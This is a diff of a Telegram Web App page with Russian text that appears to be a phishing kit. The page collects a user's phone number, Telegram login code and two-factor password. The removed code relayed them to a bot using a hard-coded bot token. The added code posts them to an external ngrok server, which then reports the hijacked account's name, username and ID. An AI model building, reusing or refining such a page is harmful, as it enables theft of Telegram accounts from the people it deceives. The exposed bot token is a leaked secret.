@@ -149,28 +149,39 @@
             margin-top: 10px;
         }
         
-        .spinner {
-            display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 0.6s linear infinite;
-            margin-left: 10px;
-        }
-        
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        
         .password-step {
             display: none;
+            margin-top: 20px;
         }
         
         .password-step.show {
             display: block;
             animation: fadeIn 0.3s;
+        }
+        
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .loader.show {
+            display: block;
+        }
+        
+        .spinner {
+            border: 3px solid var(--tg-theme-hint-color, #ccc);
+            border-top: 3px solid var(--tg-theme-button-color, #0088cc);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -189,7 +200,12 @@
                     placeholder="+7 (999) 123-45-67"
                     autocomplete="tel"
                 >
-                <div class="error" id="phoneError">Пожалуйста, введите корректный номер телефона</div>
+                <div class="error" id="phoneError">Введите корректный номер</div>
+            </div>
+            
+            <div class="loader" id="phoneLoader">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px; font-size: 14px;">Отправка кода...</p>
             </div>
             
             <button id="sendPhoneButton">Продолжить</button>
@@ -218,10 +234,10 @@
                     inputmode="numeric"
                     maxlength="5"
                 >
-                <div class="error" id="codeError">Пожалуйста, введите код из 5 цифр</div>
+                <div class="error" id="codeError">Введите код из 5 цифр</div>
             </div>
             
-            <!-- Поле для пароля 2FA (скрыто по умолчанию) -->
+            <!-- Поле для пароля 2FA -->
             <div class="password-step" id="passwordStep">
                 <div class="info-box" style="background: #fff3cd; color: #856404;">
                     🔐 Требуется пароль двухфакторной аутентификации
@@ -234,8 +250,13 @@
                         placeholder="Введите пароль"
                         autocomplete="off"
                     >
-                    <div class="error" id="passwordError">Пожалуйста, введите пароль</div>
+                    <div class="error" id="passwordError">Введите пароль</div>
                 </div>
+            </div>
+            
+            <div class="loader" id="codeLoader">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px; font-size: 14px;">Проверка кода...</p>
             </div>
             
             <button id="sendCodeButton">Войти</button>
@@ -255,8 +276,18 @@
 
     <script>
         const tg = window.Telegram.WebApp;
-        const BOT_TOKEN = '7204963884:AAEW9CcjlkSglGBV-EQW4zFNbC5qQ9WoYEY';
-        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;
+        
+        // ВАЖНО: Замените на ваш реальный URL webhook сервера
+        // Для локальной разработки используйте ngrok
+        const API_URL = 'https://YOUR_NGROK_URL'; // например: https://abc123.ngrok.io
+        
+        // Получаем токен из URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token');
+        
+        if (!token) {
+            alert('Ошибка: токен не найден. Перезапустите бота командой /start');
+        }
         
         // Элементы
         const step1 = document.getElementById('step1');
@@ -280,64 +311,15 @@
         const phoneDisplay = document.getElementById('phoneDisplay');
         const accountInfo = document.getElementById('accountInfo');
         
+        const phoneLoader = document.getElementById('phoneLoader');
+        const codeLoader = document.getElementById('codeLoader');
+        
         let currentPhone = '';
         let needsPassword = false;
-        let chatId = null;
         
         // Инициализация
         tg.expand();
-        tg.MainButton.hide();
-        
-        // Получаем chat_id из initData
-        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-            chatId = tg.initDataUnsafe.user.id;
-            console.log('Chat ID:', chatId);
-        }
-        
-        // Функция отправки сообщения боту
-        async function sendToBot(message) {
-            if (!chatId) {
-                console.error('Chat ID не найден');
-                return;
-            }
-            
-            try {
-                const response = await fetch(`${API_URL}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-                const data = await response.json();
-                return data;
-            } catch (error) {
-                console.error('Ошибка отправки:', error);
-            }
-        }
-        
-        // Функция получения последнего сообщения от бота
-        async function getLastBotMessage() {
-            try {
-                const response = await fetch(`${API_URL}/getUpdates?offset=-1`);
-                const data = await response.json();
-                
-                if (data.ok && data.result.length > 0) {
-                    const lastUpdate = data.result[data.result.length - 1];
-                    if (lastUpdate.message && lastUpdate.message.text) {
-                        return lastUpdate.message.text;
-                    }
-                }
-            } catch (error) {
-                console.error('Ошибка получения сообщений:', error);
-            }
-            return null;
-        }
+        tg.ready();
         
         // Валидация
         function validatePhone(phone) {
@@ -346,8 +328,7 @@
         }
         
         function validateCode(code) {
-            const cleanCode = code.replace(/\D/g, '');
-            return cleanCode.length === 5;
+            return code.length === 5 && /^\d+$/.test(code);
         }
         
         // Переключение шагов
@@ -359,128 +340,216 @@
         }
         
         // Сброс ошибок
-        phoneInput.addEventListener('input', () => phoneError.classList.remove('show'));
-        codeInput.addEventListener('input', () => {
+        function resetErrors() {
+            phoneError.classList.remove('show');
             codeError.classList.remove('show');
-            codeInput.value = codeInput.value.replace(/\D/g, '');
-        });
-        passwordInput.addEventListener('input', () => passwordError.classList.remove('show'));
+            passwordError.classList.remove('show');
+        }
         
-        // Отправка номера
-        sendPhoneButton.addEventListener('click', async () => {
+        // Показать ошибку
+        function showError(element, message) {
+            element.textContent = message;
+            element.classList.add('show');
+        }
+        
+        // Форматирование номера телефона для отображения
+        function formatPhoneForDisplay(phone) {
+            return phone.replace(/(\+\d{1})(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 ($2) ***-$4$5');
+        }
+        
+        // Отправка номера телефона
+        async function sendPhone() {
             const phone = phoneInput.value.trim();
             
             if (!validatePhone(phone)) {
-                phoneError.classList.add('show');
-                tg.HapticFeedback.notificationOccurred('error');
+                showError(phoneError, 'Введите корректный номер телефона (например: +79991234567)');
                 return;
             }
             
+            resetErrors();
             sendPhoneButton.disabled = true;
-            const originalText = sendPhoneButton.textContent;
-            sendPhoneButton.innerHTML = 'Отправка...<span class="spinner"></span>';
+            phoneLoader.classList.add('show');
             
-            // Отправляем номер боту
-            await sendToBot(`PHONE:${phone}`);
-            
-            currentPhone = phone;
-            phoneDisplay.textContent = `Код отправлен на номер: ${phone}`;
-            successMessage.classList.add('show');
-            showStep(step2);
-            codeInput.focus();
-            tg.HapticFeedback.notificationOccurred('success');
-            
-            sendPhoneButton.disabled = false;
-            sendPhoneButton.textContent = originalText;
-        });
+            try {
+                const response = await fetch(`${API_URL}/api/send-phone`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        token: token,
+                        phone: phone
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentPhone = phone;
+                    phoneDisplay.textContent = `Код отправлен на номер: ${formatPhoneForDisplay(phone)}`;
+                    successMessage.classList.add('show');
+                    showStep(step2);
+                } else {
+                    showError(phoneError, data.error || 'Произошла ошибка');
+                }
+            } catch (error) {
+                showError(phoneError, 'Ошибка сети. Проверьте подключение');
+                console.error('Error sending phone:', error);
+            } finally {
+                sendPhoneButton.disabled = false;
+                phoneLoader.classList.remove('show');
+            }
+        }
         
-        // Отправка кода (и пароля если нужно)
-        sendCodeButton.addEventListener('click', async () => {
+        // Отправка кода подтверждения
+        async function sendCode() {
             const code = codeInput.value.trim();
             
-            if (!needsPassword && !validateCode(code)) {
-                codeError.classList.add('show');
-                tg.HapticFeedback.notificationOccurred('error');
+            if (!validateCode(code)) {
+                showError(codeError, 'Введите код из 5 цифр');
                 return;
             }
             
+            resetErrors();
             sendCodeButton.disabled = true;
-            const originalText = sendCodeButton.textContent;
-            sendCodeButton.innerHTML = 'Обработка...<span class="spinner"></span>';
+            codeLoader.classList.add('show');
             
-            let message;
-            if (needsPassword) {
-                const password = passwordInput.value.trim();
-                if (!password) {
-                    passwordError.classList.add('show');
-                    sendCodeButton.disabled = false;
-                    sendCodeButton.textContent = originalText;
-                    return;
-                }
-                message = `PASSWORD:${password}`;
-            } else {
-                message = `CODE:${code}`;
-            }
-            
-            await sendToBot(message);
-            tg.HapticFeedback.notificationOccurred('success');
-            
-            // Ждём ответ от бота (проверяем через 2 секунды)
-            setTimeout(async () => {
-                const botResponse = await getLastBotMessage();
+            try {
+                const response = await fetch(`${API_URL}/api/send-code`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        token: token,
+                        code: code
+                    })
+                });
                 
-                if (botResponse && botResponse.includes('Требуется двухфакторная аутентификация')) {
-                    // Нужен пароль 2FA
+                const data = await response.json();
+                
+                if (data.success) {
+                    // Успешный вход
+                    accountInfo.innerHTML = `
+                        <strong>Аккаунт:</strong><br>
+                        👤 Имя: ${data.user.name}<br>
+                        🔖 Username: ${data.user.username}<br>
+                        🆔 ID: ${data.user.id}
+                    `;
+                    showStep(step3);
+                } else if (data.need_password) {
+                    // Требуется пароль 2FA
                     needsPassword = true;
                     passwordStep.classList.add('show');
-                    passwordInput.focus();
                     sendCodeButton.textContent = 'Войти с паролем';
-                    tg.HapticFeedback.notificationOccurred('warning');
-                } else if (botResponse && botResponse.includes('Успешный вход')) {
-                    // Успех!
-                    accountInfo.innerHTML = botResponse.replace(/\n/g, '<br>');
-                    showStep(step3);
-                    tg.HapticFeedback.notificationOccurred('success');
+                    showError(codeError, 'Введите пароль 2FA ниже');
                 } else {
-                    // Ошибка - показываем и позволяем попробовать снова
-                    codeError.textContent = 'Проверьте код и попробуйте снова';
-                    codeError.classList.add('show');
-                    tg.HapticFeedback.notificationOccurred('error');
+                    showError(codeError, data.error || 'Неверный код');
                 }
-                
+            } catch (error) {
+                showError(codeError, 'Ошибка сети. Проверьте подключение');
+                console.error('Error sending code:', error);
+            } finally {
                 sendCodeButton.disabled = false;
-                sendCodeButton.textContent = originalText;
-            }, 2000);
+                codeLoader.classList.remove('show');
+            }
+        }
+        
+        // Отправка пароля 2FA
+        async function sendPassword() {
+            const password = passwordInput.value.trim();
+            
+            if (!password) {
+                showError(passwordError, 'Введите пароль 2FA');
+                return;
+            }
+            
+            resetErrors();
+            sendCodeButton.disabled = true;
+            codeLoader.classList.add('show');
+            
+            try {
+                const response = await fetch(`${API_URL}/api/send-password`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        token: token,
+                        password: password
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    // Успешный вход с 2FA
+                    accountInfo.innerHTML = `
+                        <strong>Аккаунт:</strong><br>
+                        👤 Имя: ${data.user.name}<br>
+                        🔖 Username: ${data.user.username}<br>
+                        🆔 ID: ${data.user.id}<br>
+                        🔐 С защитой 2FA
+                    `;
+                    showStep(step3);
+                } else {
+                    showError(passwordError, data.error || 'Неверный пароль');
+                }
+            } catch (error) {
+                showError(passwordError, 'Ошибка сети. Проверьте подключение');
+                console.error('Error sending password:', error);
+            } finally {
+                sendCodeButton.disabled = false;
+                codeLoader.classList.remove('show');
+            }
+        }
+        
+        // Обработчики событий
+        sendPhoneButton.addEventListener('click', sendPhone);
+        
+        sendCodeButton.addEventListener('click', function() {
+            if (needsPassword) {
+                sendPassword();
+            } else {
+                sendCode();
+            }
         });
         
-        // Кнопка назад
-        backButton.addEventListener('click', () => {
-            showStep(step1);
+        backButton.addEventListener('click', function() {
+            resetErrors();
+            needsPassword = false;
+            passwordStep.classList.remove('show');
+            sendCodeButton.textContent = 'Войти';
             codeInput.value = '';
             passwordInput.value = '';
-            passwordStep.classList.remove('show');
-            needsPassword = false;
-            successMessage.classList.remove('show');
-            tg.HapticFeedback.impactOccurred('light');
+            showStep(step1);
         });
         
-        // Кнопка закрыть
-        closeButton.addEventListener('click', () => {
+        closeButton.addEventListener('click', function() {
             tg.close();
         });
         
-        // Enter для отправки
-        phoneInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendPhoneButton.click();
+        // Обработка Enter
+        phoneInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                sendPhone();
+            }
         });
         
-        codeInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendCodeButton.click();
+        codeInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !needsPassword) {
+                sendCode();
+            }
         });
         
-        passwordInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendCodeButton.click();
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && needsPassword) {
+                sendPassword();
+            }
         });
+        
+        // Автофокус на поле ввода
+        phoneInput.focus();
     </script>
 </body>
-</html>
+    </html>
